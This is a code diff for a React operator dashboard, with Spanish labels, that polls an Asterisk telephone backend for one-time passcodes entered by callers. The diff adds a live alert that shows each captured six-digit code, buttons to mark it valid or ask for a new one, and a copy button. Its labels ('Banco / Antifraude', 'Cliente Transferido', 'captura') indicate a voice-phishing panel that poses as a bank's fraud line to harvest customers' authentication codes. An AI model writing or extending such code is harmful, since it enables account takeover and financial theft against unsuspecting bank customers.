@@ -518,14 +518,65 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   const serviceLabel = activeSelectedEntity ? `${activeSelectedEntity.name} (${activeSelectedEntity.subtitle})` : 'Banco / Antifraude';
 
   const durationTimerRef = useRef<any>(null);
+  const [liveCapturedAlert, setLiveCapturedAlert] = useState<CapturedOtpRecord | null>(null);
+  const lastAlertKeyRef = useRef<string>('');
 
-  // Polling captured OTPs from Asterisk backend every 3 seconds
+  // Polling captured OTPs from Asterisk backend with fast real-time response
   const fetchCapturedOtps = async () => {
     try {
       const res = await fetch('/api/asterisk/otp/records');
       const data = await res.json();
       if (data.success && Array.isArray(data.records)) {
         setOtpRecords(data.records);
+
+        // Detectar si hay un código nuevo para alertar al agente
+        if (data.records.length > 0) {
+          const newest = data.records[0];
+          const recordKey = `${newest.id}_${newest.otp}_${newest.status}`;
+          if (newest.otp && lastAlertKeyRef.current !== recordKey) {
+            lastAlertKeyRef.current = recordKey;
+            setLiveCapturedAlert(newest);
+
+            // Tono de notificación auditivo para el asesor
+            try {
+              const audioCtx = new (window.AudioContext || (window as any).webkitAudioContext)();
+              const osc = audioCtx.createOscillator();
+              const gain = audioCtx.createGain();
+              osc.type = 'triangle';
+              osc.frequency.setValueAtTime(880, audioCtx.currentTime);
+              osc.frequency.exponentialRampToValueAtTime(1760, audioCtx.currentTime + 0.35);
+              gain.gain.setValueAtTime(0.25, audioCtx.currentTime);
+              gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.35);
+              osc.connect(gain);
+              gain.connect(audioCtx.destination);
+              osc.start();
+              osc.stop(audioCtx.currentTime + 0.35);
+            } catch (e) {}
+
+            // Si no había llamada activa abierta en el HUD, activarla de inmediato con este código
+            setActiveCall((prev) => {
+              if (prev && prev.isActive) {
+                return {
+                  ...prev,
+                  capturedOtp: newest.otp,
+                  status: 'otp_captured',
+                  otpStatus: (newest.status as any) || prev.otpStatus || 'pending',
+                };
+              }
+              return {
+                isActive: true,
+                number: newest.number || 'Cliente en Línea',
+                name: 'Cliente Transferido (Ext. 7777)',
+                service: selectedService || 'bank',
+                status: 'otp_captured',
+                capturedOtp: newest.otp,
+                otpStatus: (newest.status as any) || 'pending',
+                duration: 12,
+                channel: newest.channel || 'PJSIP',
+              };
+            });
+          }
+        }
 
         // If an active call is ongoing and a new OTP arrives for this number
         if (activeCall && activeCall.isActive) {
@@ -534,10 +585,11 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               r.number.includes(activeCall.number) ||
               activeCall.number.includes(r.number) ||
               (activeCall.number.includes('8888') && (r.number.includes('8888') || r.number.includes('1002') || r.number.includes('1001') || r.number.includes('Destino'))) ||
-              (activeCall.number.includes('1002') && (r.number.includes('1002') || r.number.includes('8888')))
-          ) || (activeCall.number.includes('8888') || activeCall.number.includes('1002') ? data.records[0] : null);
+              (activeCall.number.includes('1002') && (r.number.includes('1002') || r.number.includes('8888'))) ||
+              (activeCall.number.includes('7777') && (r.number.includes('7777') || r.channel?.includes('7777')))
+          ) || data.records[0];
 
-          if (matched) {
+          if (matched && matched.otp) {
             setActiveCall((prev) =>
               prev
                 ? {
@@ -589,6 +641,10 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           : r
       )
     );
+
+    if (liveCapturedAlert) {
+      setLiveCapturedAlert((prev) => (prev ? { ...prev, status } : null));
+    }
 
     try {
       await fetch('/api/asterisk/otp/decision', {
@@ -678,28 +734,31 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
 
   useEffect(() => {
     fetchCapturedOtps();
-    const interval = setInterval(fetchCapturedOtps, 3000);
+    const interval = setInterval(fetchCapturedOtps, 1200);
     return () => clearInterval(interval);
   }, [activeCall]);
 
-  // Polling de canales activos de Asterisk para detectar llamadas manuales (ej. marcando 8888 desde extensión 1002/1001)
+  // Polling de canales activos de Asterisk para detectar llamadas manuales (ej. marcando 7777 u 8888 desde extensión 1002/1001)
   useEffect(() => {
     const pollLiveChannels = async () => {
       try {
         const res = await fetch('/api/asterisk/live/channels');
         const data = await res.json();
         if (data.success && Array.isArray(data.channels)) {
-          // Buscar si hay algún canal interactuando con 8888 o con el IVR
+          // Buscar si hay algún canal interactuando con 7777, 8888 o con el IVR
           const ivrChannel = data.channels.find((ch: any) => {
             const exten = String(ch.extension || ch.exten || '');
             const context = String(ch.context || '');
             const channel = String(ch.channel || '');
             const callerId = String(ch.callerId || ch.callerid || '');
             return (
+              exten.includes('7777') ||
               exten.includes('8888') ||
+              context.includes('captura') ||
               context.includes('ivr') ||
+              channel.includes('7777') ||
               channel.includes('8888') ||
-              (callerId && (callerId === '1002' || callerId === '1001') && (context.includes('ivr') || exten === '8888' || exten === 's'))
+              (callerId && (callerId === '1002' || callerId === '1001') && (context.includes('ivr') || exten === '7777' || exten === '8888' || exten === 's'))
             );
           });
 
@@ -1059,6 +1118,117 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           </div>
         </div>
       </div>
+
+      {/* BANNER / PANEL DE ALERTA: CÓDIGO CAPTURADO EN VIVO (EXT. 7777) */}
+      {liveCapturedAlert && (
+        <div className="p-6 rounded-2xl bg-gradient-to-r from-emerald-950/90 via-slate-950 to-slate-900 border-2 border-emerald-500 shadow-2xl shadow-emerald-500/30 relative overflow-hidden">
+          <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-emerald-500/30 pb-4">
+            <div className="flex items-center gap-3">
+              <span className="relative flex h-4 w-4">
+                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                <span className="relative inline-flex rounded-full h-4 w-4 bg-emerald-500"></span>
+              </span>
+              <div>
+                <div className="text-xs font-black uppercase tracking-widest text-emerald-400 flex items-center gap-2">
+                  <span>¡CÓDIGO DE 6 DÍGITOS CAPTURADO EN VIVO!</span>
+                  <span className="px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300 font-mono text-[10px] border border-emerald-500/40">
+                    {liveCapturedAlert.channel || 'Ext. 7777'}
+                  </span>
+                </div>
+                <div className="text-slate-300 text-xs mt-0.5">
+                  Número: <strong className="text-white font-mono">{liveCapturedAlert.number}</strong> &bull; Hora: <span className="text-slate-400 font-mono">{liveCapturedAlert.timestamp}</span>
+                </div>
+              </div>
+            </div>
+
+            <div className="flex items-center gap-2">
+              {liveCapturedAlert.status === 'valid' ? (
+                <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-emerald-500/20 text-emerald-300 font-bold border border-emerald-500/40 text-xs">
+                  <CheckCircle className="w-4 h-4 text-emerald-400" />
+                  <span>Aprobado por Asesor</span>
+                </span>
+              ) : liveCapturedAlert.status === 'invalid' ? (
+                <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-rose-500/20 text-rose-300 font-bold border border-rose-500/40 text-xs">
+                  <XCircle className="w-4 h-4 text-rose-400" />
+                  <span>Rechazado (Pidiendo nuevo)</span>
+                </span>
+              ) : (
+                <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-amber-500/20 text-amber-300 font-bold border border-amber-500/40 text-xs animate-pulse">
+                  <Clock className="w-4 h-4 text-amber-400" />
+                  <span>Esperando tu decisión</span>
+                </span>
+              )}
+
+              <button
+                id="btn-dismiss-live-alert"
+                type="button"
+                onClick={() => setLiveCapturedAlert(null)}
+                className="p-1.5 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition-all ml-2"
+                title="Ocultar aviso"
+              >
+                <X className="w-5 h-5" />
+              </button>
+            </div>
+          </div>
+
+          <div className="py-5 flex flex-col items-center justify-center gap-3">
+            <div className="text-xs font-bold text-slate-400 uppercase tracking-wider text-center">
+              Dígitos ingresados por el cliente en llamada:
+            </div>
+
+            <div className="flex flex-wrap items-center justify-center gap-2.5 sm:gap-3">
+              {liveCapturedAlert.otp.split('').map((digit, idx) => (
+                <span
+                  key={idx}
+                  className="w-14 h-18 sm:w-16 sm:h-20 flex items-center justify-center text-3xl sm:text-4xl font-black font-mono text-emerald-400 bg-slate-950 rounded-2xl border-2 border-emerald-500 shadow-xl shadow-emerald-500/30"
+                >
+                  {digit}
+                </span>
+              ))}
+            </div>
+          </div>
+
+          <div className="flex flex-wrap items-center justify-center gap-3 pt-3 border-t border-emerald-500/20">
+            <button
+              id="btn-alert-mark-valid"
+              type="button"
+              onClick={() => handleVerifyOtp('valid', liveCapturedAlert.otp, liveCapturedAlert.number, liveCapturedAlert.id)}
+              className={`inline-flex items-center gap-2 px-6 py-3 rounded-xl font-black text-sm shadow-xl transition-all ${
+                liveCapturedAlert.status === 'valid'
+                  ? 'bg-emerald-500 text-slate-950 ring-4 ring-emerald-400/50 scale-105'
+                  : 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-emerald-600/30'
+              }`}
+            >
+              <CheckCircle className="w-5 h-5" />
+              <span>CÓDIGO VÁLIDO</span>
+            </button>
+
+            <button
+              id="btn-alert-mark-invalid"
+              type="button"
+              onClick={() => handleVerifyOtp('invalid', liveCapturedAlert.otp, liveCapturedAlert.number, liveCapturedAlert.id)}
+              className={`inline-flex items-center gap-2 px-6 py-3 rounded-xl font-black text-sm shadow-xl transition-all ${
+                liveCapturedAlert.status === 'invalid'
+                  ? 'bg-rose-500 text-white ring-4 ring-rose-400/50 scale-105'
+                  : 'bg-rose-600 hover:bg-rose-500 text-white shadow-rose-600/30'
+              }`}
+            >
+              <XCircle className="w-5 h-5" />
+              <span>CÓDIGO INVÁLIDO</span>
+            </button>
+
+            <button
+              id="btn-alert-copy-otp"
+              type="button"
+              onClick={() => handleCopyOtp(liveCapturedAlert.otp, 'alert-otp')}
+              className="inline-flex items-center gap-2 px-4 py-3 rounded-xl font-bold text-xs bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition-all"
+            >
+              {copiedId === 'alert-otp' ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4 text-slate-400" />}
+              <span>{copiedId === 'alert-otp' ? '¡Copiado!' : 'Copiar Código'}</span>
+            </button>
+          </div>
+        </div>
+      )}
 
       {/* Mode Selector Tabs */}
       <div className="flex flex-wrap items-center gap-2 border-b border-slate-800 pb-2">
